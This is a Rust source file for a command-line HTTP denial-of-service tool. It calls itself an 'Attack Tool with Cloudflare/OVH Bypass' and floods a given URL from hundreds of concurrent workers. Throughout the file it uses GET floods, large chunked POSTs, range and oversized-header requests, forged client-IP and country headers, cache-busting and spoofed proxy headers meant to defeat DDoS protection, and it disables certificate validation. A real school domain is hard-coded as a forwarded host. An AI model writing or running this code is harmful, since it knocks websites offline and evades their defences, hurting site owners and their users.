use std::sync::{Arc, atomic::{AtomicU64, Ordering}};
use std::time::Instant;
use reqwest::Client;
use clap::{Parser, ValueEnum};
use std::time::Duration;

#[derive(Parser, Debug)]
#[command(name = "Advanced Layer 7 Stress Test")]
#[command(about = "Advanced HTTP Layer 7 Attack Tool with Cloudflare/OVH Bypass", long_about = None)]
struct Args {
    /// Target URL
    #[arg(short, long)]
    url: String,

    /// Number of concurrent connections
    #[arg(short = 'c', long, default_value = "500")]
    connections: usize,

    /// Duration of test in seconds
    #[arg(short = 'd', long, default_value = "60")]
    duration: u64,

    /// Attack method
    #[arg(short = 'm', long, value_enum, default_value = "mixed")]
    method: AttackMethod,

    /// Request timeout in seconds
    #[arg(short = 't', long, default_value = "30")]
    timeout: u64,

    /// Payload size in KB (1-10000)
    #[arg(short = 'p', long, default_value = "1024")]
    payload_size: usize,

    /// Enable connection pooling
    #[arg(short = 'P', long)]
    enable_pooling: bool,

    /// Enable HTTP/2 multiplexing
    #[arg(long)]
    http2: bool,

    /// Randomize User-Agent
    #[arg(long)]
    randomize_ua: bool,

    /// Bypass mode (cloudflare, ovh, generic)
    #[arg(short = 'b', long, value_enum, default_value = "generic")]
    bypass_mode: BypassMode,

    /// Number of retries on failure
    #[arg(short = 'r', long, default_value = "3")]
    retries: u32,

    /// Enable verbose logging
    #[arg(short = 'v', long)]
    verbose: bool,
}

#[derive(Debug, Clone, ValueEnum)]
enum BypassMode {
    /// Generic bypass (random headers, path variation)
    Generic,
    /// Cloudflare-specific bypass techniques
    Cloudflare,
    /// OVH DDoS protection bypass
    Ovh,
}

#[derive(Debug, Clone, ValueEnum)]
enum AttackMethod {
    /// GET with large payloads
    GetFlood,
    /// POST with chunked encoding
    PostChunked,
    /// Range request (partial content)
    RangeRequest,
    /// HTTP/1.1 pipelining
    Pipeline,
    /// Slowloris (slow headers)
    Slowloris,
    /// Slow POST (slow body)
    SlowPost,
    /// Large request headers
    LargeHeaders,
    /// Connection reuse
    ConnReuse,
    /// All combined
    Mixed,
}

#[derive(Clone)]
struct TestConfig {
    url: String,
    connections: usize,
    duration: u64,
    method: AttackMethod,
    timeout: u64,
    payload_size: usize,
    enable_pooling: bool,
    http2: bool,
    randomize_ua: bool,
    bypass_mode: BypassMode,
    retries: u32,
    verbose: bool,
}

struct TestResults {
    total_requests: u64,
    successful_requests: u64,
    failed_requests: u64,
    total_bytes_sent: u64,
    total_time: f64,
    requests_per_second: f64,
    bandwidth_mbps: f64,
}

impl TestResults {
    fn print(&self) {
        println!("\n╔═══════════════════════════════════════╗");
        println!("║       ADVANCED STRESS TEST RESULTS    ║");
        println!("╠═══════════════════════════════════════╣");
        println!("║ Total Requests:     {:>18} ║", self.total_requests);
        println!("║ Successful:         {:>18} ║", self.successful_requests);
        println!("║ Failed:             {:>18} ║", self.failed_requests);
        println!("║ Total Data Sent:    {:>18} MB ║", self.total_bytes_sent / 1_000_000);
        println!("║ Duration:           {:>18.2} s ║", self.total_time);
        println!("║ Requests/sec:       {:>18.2} ║", self.requests_per_second);
        println!("║ Bandwidth (Mbps):   {:>18.2} ║", self.bandwidth_mbps);
        println!("╚═══════════════════════════════════════╝\n");
    }
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    let config = TestConfig {
        url: args.url,
        connections: args.connections,
        duration: args.duration,
        method: args.method,
        timeout: args.timeout,
        payload_size: args.payload_size,
        enable_pooling: args.enable_pooling,
        http2: args.http2,
        randomize_ua: args.randomize_ua,
        bypass_mode: args.bypass_mode,
        retries: args.retries,
        verbose: args.verbose,
    };

    println!("╔══════════════════════════════════════════╗");
    println!("║   ADVANCED LAYER 7 STRESS TEST TOOL    ║");
    println!("╠══════════════════════════════════════════╣");
    println!("║ Target:       {:<28} ║", config.url);
    println!("║ Connections:  {:<28} ║", config.connections);
    println!("║ Duration:     {:<28} s ║", config.duration);
    println!("║ Method:       {:<28} ║", format!("{:?}", config.method));
    println!("║ Bypass Mode:  {:<28} ║", format!("{:?}", config.bypass_mode));
    println!("║ Payload Size: {:<28} KB ║", config.payload_size);
    println!("╚══════════════════════════════════════════╝\n");

    let total_requests = Arc::new(AtomicU64::new(0));
    let successful_requests = Arc::new(AtomicU64::new(0));
    let failed_requests = Arc::new(AtomicU64::new(0));
    let total_bytes_sent = Arc::new(AtomicU64::new(0));

    let start_time = Instant::now();
    let mut handles = vec![];

    for worker_id in 0..config.connections {
        let config = config.clone();
        let total = Arc::clone(&total_requests);
        let success = Arc::clone(&successful_requests);
        let failed = Arc::clone(&failed_requests);
        let bytes = Arc::clone(&total_bytes_sent);

        let handle = tokio::spawn(async move {
            execute_attack(
                worker_id,
                config,
                total,
                success,
                failed,
                bytes,
                start_time,
            )
            .await;
        });

        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }

    let elapsed = start_time.elapsed().as_secs_f64();
    let total = total_requests.load(Ordering::Relaxed);
    let success = successful_requests.load(Ordering::Relaxed);
    let failed = failed_requests.load(Ordering::Relaxed);
    let bytes = total_bytes_sent.load(Ordering::Relaxed);

    let results = TestResults {
        total_requests: total,
        successful_requests: success,
        failed_requests: failed,
        total_bytes_sent: bytes,
        total_time: elapsed,
        requests_per_second: total as f64 / elapsed,
        bandwidth_mbps: (bytes as f64 * 8.0) / (elapsed * 1_000_000.0),
    };

    results.print();
}

async fn execute_attack(
    worker_id: usize,
    config: TestConfig,
    total_requests: Arc<AtomicU64>,
    successful_requests: Arc<AtomicU64>,
    failed_requests: Arc<AtomicU64>,
    total_bytes_sent: Arc<AtomicU64>,
    start_time: Instant,
) {
    let client = build_client(&config);
    let mut retry_count;

    while start_time.elapsed().as_secs() < config.duration {
        retry_count = 0;
        let mut result = false;
        let mut bytes_sent = 0u64;

        while retry_count < config.retries && !result {
            let (success, bytes) = match &config.method {
                AttackMethod::GetFlood => send_get_flood(&client, &config).await,
                AttackMethod::PostChunked => send_post_chunked(&client, &config).await,
                AttackMethod::RangeRequest => send_range_request(&client, &config).await,
                AttackMethod::Pipeline => send_pipelined(&client, &config).await,
                AttackMethod::Slowloris => send_slowloris(&client, &config).await,
                AttackMethod::SlowPost => send_slow_post(&client, &config).await,
                AttackMethod::LargeHeaders => send_large_headers(&client, &config).await,
                AttackMethod::ConnReuse => send_conn_reuse(&client, &config).await,
                AttackMethod::Mixed => send_mixed(&client, &config).await,
            };

            if success {
                result = true;
                bytes_sent = bytes;
            }
            retry_count += 1;
        }

        total_requests.fetch_add(1, Ordering::Relaxed);
        total_bytes_sent.fetch_add(bytes_sent, Ordering::Relaxed);

        if result {
            successful_requests.fetch_add(1, Ordering::Relaxed);
            if config.verbose {
                println!("[Worker {}] ✓ Request successful ({} bytes)", worker_id, bytes_sent);
            }
        } else {
            failed_requests.fetch_add(1, Ordering::Relaxed);
            if config.verbose {
                println!("[Worker {}] ✗ Request failed", worker_id);
            }
        }
    }
}

fn build_client(config: &TestConfig) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(config.timeout))
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(if config.enable_pooling { 100 } else { 1 });

    if config.http2 {
        builder = builder.http2_prior_knowledge();
    }

    builder.build().unwrap()
}

fn get_bypass_headers(config: &TestConfig) -> Vec<(String, String)> {
    let mut headers = vec![];

    match config.bypass_mode {
        BypassMode::Cloudflare => {
            // Advanced Cloudflare bypass techniques - IP spoofing (4 different headers)
            headers.push(("CF-Connecting-IP".to_string(), random_ip()));
            headers.push(("X-Forwarded-For".to_string(), random_ip()));
            headers.push(("X-Real-IP".to_string(), random_ip()));
            headers.push(("X-Client-IP".to_string(), random_ip()));
            
            // Dynamic country rotation (defeats geo-blocking)
            headers.push(("CF-IPCountry".to_string(), random_country()));
            
            // Proxy headers (session bypass)
            headers.push(("X-Proxy-Authorization".to_string(), "Basic dXNlcjpwYXNz".to_string()));
            headers.push(("X-Original-URL".to_string(), "/".to_string()));
            headers.push(("X-Rewrite-URL".to_string(), "/".to_string()));
            headers.push(("X-Original-Host".to_string(), random_country_to_domain()));
            
            // LiteSpeed specific bypasses (cache-busting)
            headers.push(("X-Litespeed-Location".to_string(), "/".to_string()));
            headers.push(("X-Litespeed-Cache-Control".to_string(), "no-cache".to_string()));
            headers.push(("Cache-Control".to_string(), "no-cache, no-store, must-revalidate, max-age=0".to_string()));
            headers.push(("Pragma".to_string(), "no-cache".to_string()));
            headers.push(("Expires".to_string(), "0".to_string()));
            
            // Proxy chain spoofing
            headers.push(("Via".to_string(), format!("1.1 {}", random_proxy())));
            headers.push(("X-Forwarded-Host".to_string(), "www.smkn1-cmi.sch.id".to_string()));
            headers.push(("X-Forwarded-Proto".to_string(), "https".to_string()));
            
            // Anti-bot detection headers
            headers.push(("Accept-Language".to_string(), "en-US,en;q=0.9".to_string()));
            headers.push(("Accept".to_string(), "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8".to_string()));
            headers.push(("DNT".to_string(), "1".to_string()));
            headers.push(("Upgrade-Insecure-Requests".to_string(), "1".to_string()));
            headers.push(("Sec-Fetch-Dest".to_string(), "document".to_string()));
            headers.push(("Sec-Fetch-Mode".to_string(), "navigate".to_string()));
            headers.push(("Sec-Fetch-Site".to_string(), "none".to_string()));
            headers.push(("Sec-Fetch-User".to_string(), "?1".to_string()));
            
            // Additional headers to defeat pattern matching
            headers.push(("X-Requested-With".to_string(), "XMLHttpRequest".to_string()));
            headers.push(("X-API-Version".to_string(), "v1".to_string()));
            headers.push(("X-Device-ID".to_string(), random_device_id()));
            headers.push(("X-Session-ID".to_string(), random_session_id()));
        }
        BypassMode::Ovh => {
            headers.push(("X-Forwarded-For".to_string(), random_ip()));
            headers.push(("X-Original-URL".to_string(), "/".to_string()));
            headers.push(("X-Rewrite-URL".to_string(), "/".to_string()));
            headers.push(("X-Client-IP".to_string(), random_ip()));
            headers.push(("X-Forwarded-Proto".to_string(), "https".to_string()));
        }
        BypassMode::Generic => {
            headers.push(("X-Forwarded-For".to_string(), random_ip()));
            headers.push(("X-Forwarded-Proto".to_string(), "https".to_string()));
            headers.push(("X-Original-IP".to_string(), random_ip()));
            headers.push(("X-Client-IP".to_string(), random_ip()));
            headers.push(("Via".to_string(), format!("1.1 {}", random_proxy())));
        }
    }

    headers
}

fn get_user_agent(randomize: bool) -> String {
    let agents = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    ];

    if randomize {
        use std::collections::hash_map::RandomState;
        use std::hash::{BuildHasher, Hasher};
        
        let mut hasher = RandomState::new().build_hasher();
        hasher.write_u64(std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos() as u64);
        let idx = (hasher.finish() as usize) % agents.len();
        agents[idx].to_string()
    } else {
        agents[0].to_string()
    }
}

fn random_ip() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64);
    
    let val = hasher.finish();
    let a = ((val >> 24) & 0xFF) as u8;
    let b = ((val >> 16) & 0xFF) as u8;
    let c = ((val >> 8) & 0xFF) as u8;
    let d = (val & 0xFF) as u8;
    
    format!("{}.{}.{}.{}", a, b, c, d)
}

fn random_country() -> String {
    let countries = vec!["US", "GB", "DE", "FR", "JP", "CN", "IN", "BR", "CA", "AU"];
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64);
    let idx = (hasher.finish() as usize) % countries.len();
    countries[idx].to_string()
}

fn random_proxy() -> String {
    let proxies = vec![
        "1.0 squid",
        "1.1 nginx",
        "1.1 apache",
        "1.0 varnish",
        "1.1 cloudflare",
    ];
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .subsec_nanos() as u64);
    let idx = (hasher.finish() as usize) % proxies.len();
    proxies[idx].to_string()
}

async fn send_get_flood(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let payload = "A".repeat(config.payload_size * 1024);
    let mut request = client.get(url).header("User-Agent", ua);
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    request = request
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Accept-Language", "en-US,en;q=0.9")
        .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        .header("DNT", "1")
        .header("Connection", "keep-alive")
        .header("Upgrade-Insecure-Requests", "1")
        .header("Cache-Control", "no-cache, no-store, must-revalidate");

    match request.send().await {
        Ok(_) => (true, payload.len() as u64),
        Err(_) => (false, 0),
    }
}

async fn send_post_chunked(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let payload = "X".repeat(config.payload_size * 1024);
    let mut request = client.post(url).header("User-Agent", ua);
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    request = request
        .header("Transfer-Encoding", "chunked")
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(payload.clone());

    match request.send().await {
        Ok(_) => (true, payload.len() as u64),
        Err(_) => (false, 0),
    }
}

async fn send_range_request(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let mut request = client.get(url).header("User-Agent", ua);
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    let range_size = config.payload_size * 1024;
    let range_header = format!("bytes=0-{}", range_size);
    request = request.header("Range", range_header);

    match request.send().await {
        Ok(_) => (true, range_size as u64),
        Err(_) => (false, 0),
    }
}

async fn send_pipelined(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let mut request = client.get(url).header("User-Agent", ua);
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    request = request.header("Connection", "keep-alive");

    match request.send().await {
        Ok(_) => (true, config.payload_size as u64),
        Err(_) => (false, 0),
    }
}

async fn send_slowloris(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let mut request = client.get(url)
        .header("User-Agent", ua)
        .header("Connection", "keep-alive")
        .header("X-a", "b");
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    match request.send().await {
        Ok(_) => (true, config.payload_size as u64),
        Err(_) => (false, 0),
    }
}

async fn send_slow_post(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let payload = vec![b'X'; config.payload_size * 1024].into_iter().collect::<Vec<u8>>();
    let mut request = client.post(url).header("User-Agent", ua);
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    request = request
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(payload.clone());

    match request.send().await {
        Ok(_) => (true, payload.len() as u64),
        Err(_) => (false, 0),
    }
}

async fn send_large_headers(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let large_value = "X".repeat(8192);
    let mut request = client.get(url)
        .header("User-Agent", ua)
        .header("X-Large-Header", large_value.clone());
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    match request.send().await {
        Ok(_) => (true, (config.payload_size as u64 * 1024) + large_value.len() as u64),
        Err(_) => (false, 0),
    }
}

async fn send_conn_reuse(client: &Client, config: &TestConfig) -> (bool, u64) {
    let url = &config.url;
    let ua = get_user_agent(config.randomize_ua);
    let bypass_headers = get_bypass_headers(config);
    
    let mut request = client.get(url).header("User-Agent", ua);
    
    for (key, value) in bypass_headers {
        request = request.header(key, value);
    }

    request = request.header("Connection", "keep-alive");

    match request.send().await {
        Ok(_) => (true, config.payload_size as u64 * 1024),
        Err(_) => (false, 0),
    }
}

async fn send_mixed(client: &Client, config: &TestConfig) -> (bool, u64) {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64);
    let method = hasher.finish() % 8;

    match method {
        0 => send_get_flood(client, config).await,
        1 => send_post_chunked(client, config).await,
        2 => send_range_request(client, config).await,
        3 => send_pipelined(client, config).await,
        4 => send_slowloris(client, config).await,
        5 => send_slow_post(client, config).await,
        6 => send_large_headers(client, config).await,
        _ => send_conn_reuse(client, config).await,
    }
}

fn random_device_id() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64);
    format!("{:x}", hasher.finish())
}

fn random_session_id() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .subsec_millis() as u64);
    format!("{:032x}", hasher.finish())
}

fn random_country_to_domain() -> String {
    let countries = vec!["us", "uk", "de", "fr", "jp", "cn", "in", "br", "ca", "au"];
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut hasher = RandomState::new().build_hasher();
    hasher.write_u64(std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64);
    let idx = (hasher.finish() as usize) % countries.len();
    format!("{}.example.com", countries[idx])
}

